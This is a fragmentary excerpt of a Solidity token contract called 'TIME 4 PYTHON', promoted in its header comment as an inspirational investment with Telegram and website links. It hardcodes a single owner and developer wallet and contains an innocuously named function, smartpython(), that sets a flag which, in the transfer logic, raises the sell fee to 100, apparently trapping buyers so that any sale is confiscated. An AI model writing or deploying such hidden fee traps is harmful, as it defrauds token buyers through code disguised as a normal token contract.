...
/*
TIME FOR PYTHON
In the heart of the Python lies the belief in personal transformation. Every individual has the power to shed old limitations and embrace growth. $PYHTON serves as a reminder to embrace personal transformation,
 seek wisdom and aims to inspire and motivate the young generation of investors.

Telegram : https://t.me/pythonErc
 Website : https://time4python.com
*/
...
abstract contract Ownable is Context {
    ...
    constructor () {
        ...
        _owner = 0x2684CDFB3eA63F74f319Aa24C22E0605E67b6E77;
...
contract Time4Python is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0x2684CDFB3eA63F74f319Aa24C22E0605E67b6E77);
  ...
  //   TOKEN DETAILS
    ...
    string private _name = "TIME 4 PYTHON"; 
    ...
    */
    ...
    function smartpython () external virtual {
        python = 1;
    } 
    ...
    function _transfer(
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){_TotalFee = (python <= 0 ? _sellFee:100);}
